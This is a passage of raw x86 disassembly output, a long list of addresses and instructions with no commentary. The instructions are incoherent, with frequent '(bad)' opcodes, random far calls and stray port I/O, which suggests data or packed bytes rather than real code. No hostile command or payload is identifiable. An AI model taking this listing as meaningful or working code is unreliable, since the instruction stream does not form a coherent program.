  4137d1:	pop    edi
  4137d2:	loop   0x4137f8
  4137d4:	sub    al,0xe1
  4137d6:	cmp    BYTE PTR [esi+0x2f],ah
  4137d9:	mov    DWORD PTR [esi],eax
  4137db:	mov    dh,dh
  4137dd:	loopne 0x4137b1
  4137df:	add    DWORD PTR [esi-0x3778c4a8],edx
  4137e5:	push   0xffffff94
  4137e7:	mov    bh,0x11
  4137e9:	and    cl,ch
  4137eb:	scas   eax,DWORD PTR es:[edi]
  4137ec:	pop    esp
  4137ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137ee:	das    
  4137ef:	xor    DWORD PTR [edx-0x41],0x24
  4137f3:	retf   0xc164
  4137f6:	push   ecx
  4137f7:	push   esi
  4137f8:	push   ds
  4137f9:	imul   ebx,DWORD PTR [esi-0x7d],0x7c
  4137fd:	inc    ebx
  4137fe:	adc    bl,bh
  413800:	int3   
  413801:	push   ecx
  413802:	push   ds
  413803:	call   0xdaf34d62
  413808:	fdiv   DWORD PTR [ecx+0x3dc8d9c1]
  41380e:	add    BYTE PTR [ecx],ch
  413810:	dec    esp
  413811:	xchg   esp,eax
  413812:	rcl    dl,cl
  413814:	inc    edx
  413815:	xchg   ecx,eax
  413816:	push   ecx
  413817:	push   ebx
  413818:	xor    DWORD PTR [ebx],eax
  41381a:	pop    es
  41381b:	(bad)  
  41381c:	loopne 0x413878
  41381e:	stos   DWORD PTR es:[edi],eax
  41381f:	mov    edx,0xdbd62378
  413824:	sub    BYTE PTR [ebx],0x91
  413827:	lea    edi,[esi+0x45]
  41382a:	jmp    0x4137e6
  41382c:	mov    eax,0x35b3d0cb
  413831:	sbb    esi,esi
  413833:	les    edx,FWORD PTR [eax]
  413835:	mov    ds:0x971c88d4,al
  41383a:	fild   DWORD PTR [ebx-0x12]
  41383d:	pop    ecx
  41383e:	push   esi
  41383f:	adc    BYTE PTR [edx],cl
  413841:	test   BYTE PTR [edi],dl
  413843:	aad    0x99
  413845:	stc    
  413846:	pop    ds
  413847:	imul   ecx,DWORD PTR [ebx],0xb3811aae
  41384d:	xchg   esp,eax
  41384e:	cwde   
  41384f:	cs jno 0x4138ba
  413852:	sub    al,0xcd
  413854:	das    
  413855:	call   0xc2a2866e
  41385a:	xchg   ecx,edx
  41385c:	add    BYTE PTR [ecx-0x79],0xc8
  413860:	mov    ecx,0xd0978049
  413865:	mov    ecx,0xed97d72
  41386a:	rol    BYTE PTR [esp+edx*4+0x7f297023],cl
  413871:	mov    ch,0xc8
  413873:	outs   dx,BYTE PTR ds:[esi]
  413874:	mov    ch,0x8e
  413876:	and    esi,esi
  413878:	mov    ecx,cs
  41387a:	pushf  
  41387b:	call   0x2479:0xed73b57e
  413882:	cmp    BYTE PTR [ebx],bl
  413884:	sub    WORD PTR [ebx+0x55638aa],bx
  41388b:	jle    0x413862
  41388d:	pop    ecx
  41388e:	dec    ebx
  41388f:	xor    ebp,DWORD PTR [edi+ebx*2+0x36]
  413893:	les    edx,FWORD PTR [eax-0x23]
  413896:	(bad)  
  413897:	push   edx
  413898:	sbb    dh,bh
  41389a:	lahf   
  41389b:	scas   eax,DWORD PTR es:[edi]
  41389c:	lock inc esi
  41389e:	loop   0x41383a
  4138a0:	cmp    eax,0x67c474e2
  4138a5:	xor    eax,0x85d5c2a6
  4138aa:	xor    cl,BYTE PTR [esi+0x21]
  4138ad:	mov    esi,0x27022fb9
  4138b2:	js     0x4138f7
  4138b4:	inc    esi
  4138b5:	dec    edi
  4138b6:	sub    edi,esi
  4138b8:	jle    0x413876
  4138ba:	into   
  4138bb:	sbb    ebp,0x36f7e803
  4138c1:	pop    eax
  4138c2:	idiv   BYTE PTR [edx*8+0x6a5a9d52]
  4138c9:	cld    
  4138ca:	mov    BYTE PTR [ebx],al
  4138cc:	repnz push cs
  4138ce:	mov    edx,0x42ba6c62
  4138d3:	fisttp DWORD PTR [edi+ebp*1]
  4138d6:	push   cs
  4138d7:	cmp    BYTE PTR [esi+0x492ed290],bl
  4138dd:	cld    
  4138de:	call   0xb6ed176a
  4138e3:	jbe    0x4138cc
  4138e5:	and    dh,al
  4138e7:	mov    cl,cl
  4138e9:	or     dh,BYTE PTR [ebx+0x55]
  4138ec:	fstp   QWORD PTR [edx+ebx*8-0x5f2a1c5c]
  4138f3:	mov    eax,ds:0x282fb2e5
  4138f8:	shl    esi,cl
  4138fa:	adc    eax,0xf5b263f3
  4138ff:	cmc    
  413900:	xchg   esi,eax
  413901:	adc    al,0xbd
  413903:	mov    al,0xcc
  413905:	push   cs
  413906:	daa    
  413907:	out    0x1d,al
  413909:	and    eax,0x201ce2ca
  41390e:	rcl    DWORD PTR [edi-0x771353c8],cl
  413914:	mul    ah
  413916:	ins    DWORD PTR es:[edi],dx
  413917:	mov    DWORD PTR [ecx],ecx
  413919:	add    eax,0xa2fb101e
  41391e:	fadd   QWORD PTR [edx-0xc]
  413921:	aaa    
  413922:	jl     0x413916
  413924:	adc    al,0x6f
  413926:	mov    bl,0xe6
  413928:	mov    ecx,0xe175fe11
  41392d:	cdq    
  41392e:	xor    esp,DWORD PTR [ebp+0x22c73745]
  413934:	cli    
  413935:	dec    edx
  413937:	mov    ah,0x79
  413939:	ins    BYTE PTR es:[edi],dx
  41393a:	cli    
  41393b:	mov    ch,0x74
  41393d:	xor    ebp,DWORD PTR [ebp+0x15]
  413940:	mov    al,BYTE PTR [esi-0x5b]
  413943:	jl     0x413949
  413945:	mov    ah,dh
  413947:	js     0x413914
  413949:	lock (bad) ds:0x8d8d7326
  413950:	pop    eax
  413951:	call   0xb0ec:0x3ce0ccab
  413958:	sti    
  413959:	sub    BYTE PTR ds:0xadd1ba0,dl
  41395f:	cmp    eax,0x6b7e7149
  413964:	arpl   WORD PTR [ecx],sp
  413966:	jg     0x41392d
  413968:	aas    
  413969:	push   esp
  41396a:	lock in al,0x18
  41396d:	mov    BYTE PTR cs:[eax],bl
  413970:	rol    cl,cl
  413972:	psubq  mm1,mm1
  413975:	pop    edi
  413976:	pop    eax
  413977:	(bad)  
  413978:	(bad)  
  413979:	stos   DWORD PTR es:[edi],eax
  41397a:	les    edi,FWORD PTR [esi]
  41397c:	jmp    FWORD PTR [edi]
  41397e:	mov    esp,0x14262f36
  413983:	lahf   
  413984:	adc    DWORD PTR [edx+0x5c],eax
  413987:	(bad)  
  413988:	stos   DWORD PTR es:[edi],eax
  413989:	cmp    BYTE PTR [eax+0x68],bl
  41398c:	mov    ds:0x3c2bc3a3,eax
  413991:	jb     0x413937
  413993:	test   al,0xdc
  413995:	add    eax,0x38da7fde
  41399a:	rol    ah,0xd5
  41399d:	je     0x41398d
  41399f:	sub    BYTE PTR [edx],ch
  4139a1:	sub    al,0x1a
  4139a3:	cmp    eax,0x86d5edd6
  4139a8:	xchg   ebp,eax
  4139a9:	or     eax,0xf4893e54
  4139ae:	mov    bl,0x8a
  4139b0:	or     al,0xbf
  4139b2:	and    dh,BYTE PTR [edi+0x15]
  4139b5:	loope  0x413939
  4139b7:	popa   
  4139b8:	mov    edx,0x91a1ead0
  4139bd:	cmp    BYTE PTR [edi],dl
  4139bf:	inc    esp
  4139c0:	cmp    dh,BYTE PTR [edx]
  4139c2:	js     0x41394a
  4139c4:	cmp    eax,0xcc602d15
  4139c9:	pop    esp
  4139ca:	xchg   ecx,eax
  4139cb:	push   edx
  4139cc:	popa   
  4139cd:	aas    
  4139ce:	jp     0x413967
  4139d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139d1:	imul   ecx,DWORD PTR [ebp-0x3376abd4],0x58513144
  4139db:	pop    edx
  4139dc:	ins    DWORD PTR es:[edi],dx
  4139dd:	cmp    bh,cl
  4139df:	dec    ecx
  4139e0:	test   al,al
  4139e2:	test   al,0x41
  4139e4:	dec    ecx
  4139e5:	mov    ?,WORD PTR [edi]
  4139e7:	cmp    bl,dl
  4139e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139ea:	test   DWORD PTR [esi-0x36a187b2],esi
  4139f0:	(bad)  
  4139f1:	push   ebx
  4139f2:	imul   ebx,esi,0x48
  4139f5:	rcl    ch,cl
  4139f7:	mov    bl,dl
  4139f9:	popf   
  4139fa:	xchg   DWORD PTR [esi],edi
  4139fc:	jne    0x4139bb
  4139fe:	adc    BYTE PTR [edx+0x7b],cl
  413a01:	and    esp,edx
  413a03:	jae    0x413a78
  413a05:	fild   DWORD PTR [eax+0x10]
  413a08:	mov    ebp,0x713b22d1
  413a0d:	fsubp  st(1),st
  413a0f:	loope  0x413a2a
  413a11:	and    DWORD PTR [ebx-0x7fda2a67],0x6e
  413a18:	dec    eax
  413a19:	xor    edx,DWORD PTR [edi+0x31]
  413a1c:	xchg   esi,eax
  413a1d:	ss (bad) 
  413a1f:	loopne 0x4139a9
  413a21:	cwde   
  413a22:	lods   eax,DWORD PTR ss:[esi]
  413a24:	out    dx,al
  413a25:	aaa    
  413a26:	adc    esp,ebp
  413a28:	pop    ebp
  413a29:	pop    ebp
  413a2a:	pop    ebp
  413a2b:	inc    esi
  413a2c:	ins    BYTE PTR es:[edi],dx
  413a2d:	imul   esp,DWORD PTR gs:0x1c326bb,0x73
  413a35:	adc    edx,DWORD PTR [ecx+0x7fc4bfde]
  413a3b:	pop    eax
  413a3c:	je     0x413a47
  413a3e:	xchg   bl,al
  413a40:	fcom   QWORD PTR [edx+0x24abc36]
  413a46:	push   esi
  413a47:	test   al,0xce
  413a49:	int    0xed
  413a4b:	js     0x4139dd
  413a4d:	repnz mov al,0xac
  413a50:	adc    DWORD PTR [eax-0x9],eax
  413a53:	retf   0x475d
  413a56:	push   ebp
  413a57:	lods   al,BYTE PTR ds:[esi]
  413a58:	daa    
  413a59:	nop
  413a5a:	prefetch BYTE PTR [eax-0x77]
  413a5e:	mov    ebp,0xdc223ea3
  413a63:	in     al,dx
  413a64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a65:	imul   eax,DWORD PTR [ebp-0x512d108c],0xceee1106
  413a6f:	test   esp,ecx
  413a71:	enter  0xeeee,0x8b
  413a75:	and    bl,0x97
  413a78:	ds mov bh,0x3e
  413a7b:	mov    dl,0x18
  413a7d:	in     eax,0xe2
  413a7f:	adc    edx,edi
  413a81:	(bad)  
  413a82:	not    DWORD PTR es:[edi-0x2a]
  413a86:	push   ecx
  413a87:	fs dec esp
  413a89:	jl     0x413a0e
  413a8b:	test   eax,0xe9c6a9d4
  413a90:	pop    edx
  413a91:	into   
  413a92:	mov    ecx,0x193755f6
  413a97:	lods   eax,DWORD PTR ds:[esi]
  413a98:	rol    DWORD PTR [edi+edx*1-0x7],1
  413a9c:	pop    edx
  413a9d:	add    ebx,DWORD PTR [eax+edx*2+0x4f937a08]
  413aa4:	cmc    
  413aa5:	dec    ecx
  413aa6:	mov    eax,0xbe138cc0
  413aab:	or     esp,DWORD PTR [edx]
  413aad:	push   cs
  413aae:	jbe    0x413ae9
  413ab0:	sbb    ebx,DWORD PTR [eax+0x38]
  413ab3:	dec    eax
  413ab4:	mov    esp,0x6e2bbda3
  413ab9:	aad    0xe5
  413abb:	push   eax
  413abc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413abd:	sub    BYTE PTR [ebp-0x4b],0xec
  413ac1:	pop    ecx
  413ac2:	or     ebx,DWORD PTR [edi-0x6332b488]
  413ac8:	and    ebp,DWORD PTR [ecx+0x41]
  413acb:	mov    ecx,0x963bdc14
  413ad0:	mov    gs,ebx
  413ad2:	pusha  
  413ad3:	fst    st(4)
  413ad5:	pushf  
  413ad6:	jecxz  0x413acf
  413ad8:	test   DWORD PTR [eax],0xbdbe224
  413ade:	sbb    eax,0x63376980
  413ae3:	test   ebx,edx
  413ae5:	push   cs
  413ae6:	or     cl,al
  413ae8:	in     al,dx
  413ae9:	jbe    0x413ac0
  413aeb:	aaa    
  413aec:	test   eax,0xfbd530c
  413af1:	out    dx,eax
  413af2:	rcl    DWORD PTR [edx+0x4a2f19e0],0x9e
  413af9:	fistp  WORD PTR [edi+0x6c]
  413afc:	mov    cl,0x55
  413afe:	sub    ebx,DWORD PTR [edi-0x48f48382]
  413b04:	jmp    0x57735de3
  413b09:	and    esi,DWORD PTR [ebp+edx*8+0x25]
  413b0d:	push   edi
  413b0e:	inc    edx
  413b0f:	dec    ebx
  413b10:	aaa    
  413b11:	inc    ecx
  413b12:	daa    
  413b13:	push   0xffffffb7
  413b15:	cdq    
  413b16:	les    edi,FWORD PTR [edi+0x7e]
  413b19:	jno    0x413b70
  413b1b:	jle    0x413b98
  413b1d:	call   0xa70000a4
  413b22:	js     0x413ae0
  413b24:	xor    cl,BYTE PTR [esi+0x3ed07052]
  413b2a:	push   edi
  413b2b:	mov    BYTE PTR [edi-0x40],dh
  413b2e:	mov    ds:0x4ad0771,eax
  413b33:	adc    ecx,eax
  413b35:	out    dx,al
  413b36:	iret   
  413b37:	xor    eax,0x7b10985d
  413b3c:	mov    ds:0xb942bd35,eax
  413b41:	fbstp  TBYTE PTR [esi+0x18]
  413b44:	(bad)  
  413b45:	ja     0x413ae6
  413b47:	add    al,0x6c
  413b49:	xchg   BYTE PTR [ecx],bl
  413b4b:	pop    ebp
  413b4c:	push   ebp
  413b4d:	add    cl,BYTE PTR [esi-0x49]
  413b50:	cmp    bh,BYTE PTR [ebx-0x32]
  413b53:	das    
  413b54:	sub    eax,0xb0c8d17f
  413b59:	jae    0x413b85
  413b5b:	int3   
  413b5c:	fsub   QWORD PTR [ecx+edi*8+0xf]
  413b60:	jle    0x413b22
  413b62:	add    cl,BYTE PTR [edx-0x2b1d1c3a]
  413b68:	or     edx,ecx
  413b6a:	add    al,0xe7
  413b6c:	retf   
  413b6d:	and    DWORD PTR [edi],ebp
  413b6f:	fadd   DWORD PTR [ebx+ecx*8]
  413b72:	cwde   
  413b73:	dec    ecx
  413b74:	test   BYTE PTR [ebx-0x2f],bh
  413b77:	arpl   WORD PTR [ebx+0x3d],di
  413b7a:	sub    ebx,ecx
  413b7c:	and    al,0x14
  413b7e:	pushf  
  413b7f:	xlat   BYTE PTR ds:[ebx]
  413b80:	adc    al,ch
  413b82:	xchg   ebx,eax
  413b83:	out    0x2b,al
  413b85:	and    DWORD PTR [eax+0x49],eax
  413b88:	mov    eax,ds:0x90bfd291
  413b8d:	sbb    al,0xba
  413b8f:	push   ss
  413b90:	push   edi
  413b91:	call   0x7a11638
  413b96:	mov    eax,ds:0xad38c957
  413b9b:	ret    0xf122
  413b9e:	cmp    ecx,esi
  413ba0:	sar    DWORD PTR [ecx+edi*8+0x6e51f176],cl
  413ba7:	scas   eax,DWORD PTR es:[edi]
  413ba8:	pop    ebx
  413ba9:	xchg   edi,eax
  413baa:	out    dx,eax
  413bab:	ins    DWORD PTR es:[edi],dx
  413bac:	sbb    dl,BYTE PTR [ebx]
  413bae:	loop   0x413bcd
  413bb0:	retf   
  413bb1:	inc    ebp
  413bb2:	dec    ecx
  413bb3:	stc    
  413bb4:	jp     0x413b57
  413bb6:	push   cs
  413bb7:	adc    bh,dh
  413bb9:	xor    ah,BYTE PTR [edi+0x1f]
  413bbc:	jp     0x413b52
  413bbe:	imul   edx,DWORD PTR [ecx],0x61cf6ee2
  413bc4:	sub    al,0xf5
  413bc6:	mov    WORD PTR [edi+0x36cb80cb],cs
  413bcc:	xor    al,0xf4
  413bce:	stc    
  413bcf:	mov    ecx,0x27c5f31a
  413bd4:	mov    dl,0x7a
  413bd6:	rcr    BYTE PTR [ecx-0x7c44188c],0x18
  413bdd:	ins    BYTE PTR es:[edi],dx
  413bde:	clc    
  413bdf:	out    0x12,al
  413be1:	je     0x413c5a
  413be3:	push   0x48b2ef36
  413be8:	(bad)  
  413be9:	test   eax,0xe839f812
  413bee:	xchg   DWORD PTR [edx],eax
  413bf0:	push   ds
  413bf1:	jae    0x413c13
  413bf3:	imul   esp,DWORD PTR [eax+0x258cea0c],0x63
  413bfa:	call   FWORD PTR [esi]
  413bfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bfd:	imul   edi,DWORD PTR [edi-0x1a],0x4743bb4e
  413c04:	add    edi,eax
  413c06:	adc    BYTE PTR [ecx],0xb9
  413c09:	pop    ebp
  413c0a:	cmp    ecx,DWORD PTR [ecx]
  413c0c:	pop    eax
  413c0d:	dec    ebx
  413c0e:	or     edx,esi
  413c10:	push   ds
  413c11:	stos   BYTE PTR es:[edi],al
  413c12:	out    0x56,eax
  413c14:	int    0xa1
  413c16:	xchg   edi,eax
  413c17:	dec    eax
  413c18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c19:	(bad)  
  413c1a:	js     0x413c04
  413c1c:	jb     0x413c1c
  413c1e:	aad    0x7c
  413c20:	mov    esp,DWORD PTR [edi+0x5a]
  413c23:	mov    ds:0x7eafb6a3,al
  413c28:	mov    ebx,0xc2da8ca9
  413c2d:	test   BYTE PTR [ecx+0x56],dl
  413c30:	mov    ds:0x564ff654,al
  413c35:	jno    0x413c08
  413c37:	mov    cl,0xfe
  413c39:	adc    ch,ch
  413c3b:	xchg   ecx,eax
  413c3c:	sar    DWORD PTR [ecx+ebx*2],0x36
  413c40:	jecxz  0x413c87
  413c42:	stos   DWORD PTR es:[edi],eax
  413c43:	test   al,0xce
  413c45:	mov    bl,0xa8
  413c47:	push   DWORD PTR [ebp-0x32]
  413c4a:	ja     0x413be9
  413c4c:	push   ecx
  413c4d:	ja     0x413c79
  413c4f:	daa    
  413c50:	not    DWORD PTR [eax+0x19]
  413c53:	dec    eax
  413c54:	test   DWORD PTR [eax+0x3b],esp
  413c57:	add    edi,DWORD PTR ds:0x4244cc1e
  413c5d:	aam    0x52
  413c5f:	mov    bl,0xa5
  413c61:	lahf   
  413c62:	fwait
  413c63:	mov    eax,esp
  413c65:	and    DWORD PTR [ebx-0x4f],ecx
  413c68:	mov    bh,0x63
  413c6a:	cs pop esp
  413c6c:	push   esi
  413c6d:	jbe    0x413c9f
  413c6f:	push   0xffffffde
  413c71:	je     0x413c71
  413c73:	pop    ss
  413c74:	shr    DWORD PTR [ecx],0xa6
  413c77:	out    dx,al
  413c78:	mov    ds:0x9d6748f7,al
  413c7d:	popa   
  413c7e:	das    
  413c7f:	and    esp,DWORD PTR [ebx-0x49b6d572]
  413c85:	call   0x96963e71
  413c8a:	sbb    DWORD PTR [ebx],ecx
  413c8c:	rcl    esp,1
  413c8e:	mov    eax,0xc6ece8be
  413c93:	inc    esp
  413c94:	ficom  WORD PTR [edi-0x3bff41f4]
  413c9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c9b:	sbb    dl,cl
  413c9d:	dec    esp
  413c9e:	neg    ecx
  413ca0:	leave  
  413ca1:	aad    0xd2
  413ca3:	rcl    DWORD PTR [ecx+0x3d],1
  413ca6:	imul   edx,edx,0x3cf49671
  413cac:	out    dx,al
  413cad:	or     BYTE PTR [ebp-0x500be628],bl
  413cb3:	mov    esp,0x50e0ce85
  413cb8:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  413cba:	mov    cl,0xe5
  413cbc:	and    DWORD PTR [edi+esi*4+0x21d1b819],0x8d883f3d
  413cc7:	sbb    dl,0x6c
  413cca:	push   ebx
  413ccb:	js     0x413cc9
  413ccd:	xor    bh,cl
  413ccf:	sar    dh,0x28
  413cd2:	cdq    
  413cd3:	int    0x8a
  413cd5:	mov    fs,eax
  413cd7:	fcom   QWORD PTR [ebx]
  413cd9:	dec    edx
  413cda:	jmp    0xd7dadb4f
  413cdf:	xchg   esi,eax
  413ce0:	das    
  413ce1:	mov    ah,0xf6
  413ce3:	neg    BYTE PTR ss:[esi]
  413ce6:	cmc    
  413ce7:	sub    ebx,DWORD PTR [ebx+0x41fd3ded]
  413ced:	ds cmc 
  413cef:	es mov bh,0xe8
  413cf2:	xchg   edi,eax
  413cf3:	cmp    DWORD PTR [eax+0x235cf589],ecx
  413cf9:	jnp    0x413d33
  413cfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cfc:	popa   
  413cfd:	out    0xa1,eax
  413cff:	or     ah,BYTE PTR [eax+eiz*2+0x6e]
  413d03:	pop    ss
  413d04:	xchg   DWORD PTR [esi+0x17],eax
  413d07:	dec    ecx
  413d08:	adc    eax,0x34eb4d87
  413d0d:	mov    ah,0xd9
  413d0f:	int    0x2e
  413d11:	jo     0x413d76
  413d13:	sahf   
  413d14:	dec    ecx
  413d15:	dec    ebx
  413d16:	pop    edx
  413d17:	pop    ecx
  413d18:	addr16 pop ds
  413d1a:	sahf   
  413d1b:	xor    bl,BYTE PTR [eax-0x11]
  413d1e:	fmul   DWORD PTR [bp+si]
  413d21:	(bad)  
  413d22:	repnz repnz push edx
  413d25:	pusha  
  413d26:	and    al,0xa3
  413d28:	jmp    0x1131dfb7
  413d2d:	ret    0x6f0e
  413d30:	cmp    DWORD PTR [edi+0x7],0x1178d91c
  413d37:	pop    edi
  413d38:	loop   0x413d78
  413d3a:	dec    esi
  413d3b:	(bad)  
  413d3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d3e:	jle    0x413d62
  413d40:	mov    dh,0x52
  413d42:	ins    BYTE PTR es:[edi],dx
  413d43:	mov    bh,0x15
  413d45:	push   esi
  413d46:	or     al,0xb5
  413d48:	sbb    BYTE PTR [eiz*2+0x3efb418d],dh
  413d4f:	cmp    BYTE PTR [ecx],ah
  413d51:	dec    esp
  413d52:	lods   al,BYTE PTR ds:[esi]
  413d53:	pusha  
  413d54:	xchg   ebp,esp
  413d56:	pop    edi
  413d57:	(bad)  
  413d58:	xor    al,0xa6
  413d5a:	call   0xd28:0xb6c49d5a
  413d61:	push   ecx
  413d62:	aam    0x4
  413d64:	es aad 0x66
  413d67:	in     al,0xf
  413d69:	nop
  413d6a:	jae    0x413d64
  413d6c:	sti    
  413d6d:	mov    bl,BYTE PTR [ebx-0x2c]
  413d70:	xchg   esi,eax
  413d71:	addr16 dec esp
  413d73:	mov    ebx,0x13c6bed
  413d78:	jecxz  0x413dc4
  413d7a:	int3   
  413d7b:	xchg   esi,eax
  413d7c:	fist   DWORD PTR ds:0x73cfb59e
  413d82:	add    al,0x96
  413d84:	fs lock pop ebp
  413d87:	ret    0xd57a
  413d8a:	mov    ebp,0xa7f6646
  413d8f:	lahf   
  413d90:	loopne 0x413de2
  413d92:	jae    0x413dc3
  413d94:	mov    ecx,0x5d4af018
  413d99:	and    eax,0x5ac5a8c8
  413d9e:	xor    BYTE PTR [ecx],dh
  413da0:	out    0x84,al
  413da2:	das    
  413da3:	nop
  413da4:	sti    
  413da5:	pop    edi
  413da6:	icebp  
  413da7:	adc    al,al
  413da9:	cs ja  0x413e18
  413dac:	xor    DWORD PTR ds:0x482006ff,ecx
  413db2:	fdivr  QWORD PTR [edi]
  413db4:	mov    eax,0x635dd801
  413db9:	adc    al,0x57
  413dbb:	cmp    eax,0x4c222f7c
  413dc0:	out    0x13,eax
  413dc2:	sub    BYTE PTR [ebp+0x73efb669],cl
  413dc8:	xlat   BYTE PTR ds:[ebx]
  413dc9:	mov    ds:0xcd1a7ec2,al
  413dce:	outs   dx,DWORD PTR ds:[esi]
  413dcf:	test   BYTE PTR [esi+0x36555723],ah
  413dd5:	push   ebx
  413dd6:	push   0xffffffcb
  413dd8:	cwde   
  413dd9:	imul   ecx,DWORD PTR [ebx],0xffffffd3
  413ddc:	(bad)  
  413ddd:	and    eax,0x2fe7559
  413de2:	std    
  413de3:	fld    QWORD PTR [edx-0x38]
  413de6:	loope  0x413e19
  413de8:	and    BYTE PTR [edi+0x5f],dh
  413deb:	mov    eax,ds:0xf0212452
  413df0:	push   ds
  413df1:	sub    eax,0xd12aaa81
  413df6:	(bad)  
  413df7:	pop    edx
  413df8:	and    BYTE PTR [esi+0x274c701f],cl
  413dfe:	(bad)  
  413dff:	ss pop esp
  413e01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e02:	popa   
  413e03:	mov    DWORD PTR [ebx+0x5ad158a3],ecx
  413e09:	add    esp,DWORD PTR [ebx+0x3acbf1dc]
  413e0f:	(bad)  
  413e10:	jb     0x413dce
  413e12:	(bad)
  413e15:	popf   
  413e16:	push   0x71
  413e18:	retf   0xec1
  413e1b:	outs   dx,BYTE PTR ds:[esi]
  413e1c:	jge    0x413dfb
  413e1e:	sbb    al,0xd4
  413e20:	mov    ah,0x3b
  413e22:	sub    al,0x4b
  413e24:	jmp    0xd70966e3
  413e29:	in     eax,dx
  413e2a:	mov    edi,0xc61e5b8
  413e2f:	jbe    0x413e3b
  413e31:	jno    0x413e4c
  413e33:	inc    edi
  413e34:	jecxz  0x413e96
  413e36:	mov    ebp,0x6948f9b0
  413e3b:	ds stc 
  413e3d:	push   ds
  413e3e:	rcl    BYTE PTR [ebp+0x3383e042],1
  413e44:	jl     0x413e61
  413e46:	add    eax,0x8569a290
  413e4b:	out    0xb8,al
  413e4d:	adc    eax,0xf9a7c67f
  413e52:	iret   
  413e53:	cwde   
  413e54:	int    0xd1
  413e56:	pop    esp
  413e57:	mov    dl,0xa3
  413e59:	sbb    DWORD PTR [esi-0x29],0x6ff61408
  413e60:	fsub   st,st(7)
  413e62:	mov    dl,0x10
  413e64:	xchg   BYTE PTR [ecx+eax*4+0x36],ah
  413e68:	mov    al,ds:0x20504de4
  413e6d:	dec    edi
  413e6e:	mov    eax,ds:0xb9f0433
  413e73:	pop    ebx
  413e74:	xchg   ebx,eax
  413e75:	pop    esi
  413e76:	pushfw 
  413e78:	mov    ds:0xb833fe86,eax
  413e7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e7e:	jb     0x413e43
  413e80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e81:	int    0x25
  413e83:	lahf   
  413e84:	xchg   esi,eax
  413e85:	sbb    eax,ebx
  413e87:	cmp    DWORD PTR [edi+0x4b],0xffffffeb
  413e8b:	daa    
  413e8c:	icebp  
  413e8d:	inc    esp
  413e8e:	jge    0x413e8f
  413e90:	ins    BYTE PTR es:[edi],dx
  413e91:	sbb    eax,0xbf310d1e
  413e96:	or     al,0xbf
  413e98:	and    esp,DWORD PTR es:[ecx+0x38]
  413e9c:	push   esp
  413e9d:	ja     0x413f07
  413e9f:	out    dx,eax
  413ea0:	mov    ebp,0xb528f172
  413ea5:	sub    edi,ecx
  413ea7:	or     ebp,DWORD PTR [eax+0x50ab30a1]
  413ead:	pop    ebp
  413eae:	fmul   QWORD PTR [edi+edx*4]
  413eb1:	dec    edx
  413eb2:	pop    esp
  413eb3:	push   eax
  413eb4:	push   ds
  413eb5:	adc    al,0xc8
  413eb7:	inc    esi
  413eb8:	jne    0x413f1a
  413eba:	mov    BYTE PTR [ecx+ecx*8],bh
  413ebd:	leave  
  413ebe:	sbb    eax,0x1a176957
  413ec3:	aas    
  413ec4:	aam    0xa4
  413ec6:	enter  0xc68b,0x82
  413eca:	test   eax,0xe6c78984
  413ecf:	les    eax,FWORD PTR [edx]
  413ed1:	cmp    DWORD PTR [esi+ebx*2-0x5803669b],eax
  413ed8:	adc    dl,BYTE PTR [ebx]
  413eda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413edb:	mov    al,ds:0x88094a2b
  413ee0:	rcr    BYTE PTR [edi+0x3fc775e8],0x5f
  413ee7:	jg     0x413ed8
  413ee9:	cli    
  413eea:	rol    BYTE PTR [edx],cl
  413eec:	pop    eax
  413eed:	xchg   edx,eax
  413eee:	pushf  
  413eef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ef0:	jle    0x413eec
  413ef2:	retf   
  413ef3:	jmp    0x308c:0xb8105ef9
  413efa:	scas   al,BYTE PTR es:[edi]
  413efb:	pop    ebx
  413efc:	ja     0x413f12
  413efe:	rsqrtps xmm6,XMMWORD PTR [esi+0x6e2f7e64]
  413f05:	(bad)  
  413f06:	aaa    
  413f07:	mov    cl,0x39
  413f09:	push   esi
  413f0a:	xchg   ecx,eax
  413f0b:	je     0x413f49
  413f0d:	leave  
  413f0e:	data16 sub BYTE PTR [edi],dl
  413f11:	lock mov ds:0x836ef251,al
  413f17:	out    dx,eax
  413f18:	shl    BYTE PTR [ecx+0x57],0xe0
  413f1c:	test   eax,0x8b9bf3ad
  413f21:	sub    DWORD PTR ss:0x225967b8,eax
  413f28:	inc    edx
  413f29:	pop    ebp
  413f2a:	jmp    FWORD PTR [edi]
  413f2c:	pop    esp
  413f2d:	inc    esp
  413f2e:	cdq    
  413f2f:	retf   
  413f30:	xor    eax,0x5103c55e
  413f35:	aas    
  413f36:	lods   eax,DWORD PTR ds:[esi]
  413f37:	push   esp
  413f39:	pop    edi
  413f3a:	or     bh,cl
  413f3c:	and    DWORD PTR [ebx+ebp*8+0x4143fb00],0x55
  413f44:	test   ebp,ebx
  413f46:	pop    ebx
  413f47:	mov    dl,0x10
  413f49:	leave  
  413f4a:	xchg   ebx,eax
  413f4b:	xor    eax,0x97e4cfdb
  413f50:	cs in  eax,dx
  413f52:	daa    
  413f53:	fisttp DWORD PTR [eax+0x20]
  413f56:	(bad)  
  413f57:	adc    eax,0x890e07da
  413f5c:	xchg   DWORD PTR [edi+0x6a],edx
  413f5f:	mov    eax,ds:0xe25424b8
  413f64:	jecxz  0x413f69
  413f66:	push   edi
  413f67:	(bad)  
  413f68:	shl    DWORD PTR [ecx+0x16],1
  413f6b:	mov    ss,WORD PTR [ebp-0x5]
  413f6e:	mov    ds:0x46f9cbde,eax
  413f73:	pushf  
  413f74:	lods   al,BYTE PTR ds:[esi]
  413f75:	inc    esi
  413f76:	popf   
  413f77:	dec    edi
  413f78:	push   es
  413f79:	data16 clc 
  413f7b:	add    eax,0xa9209552
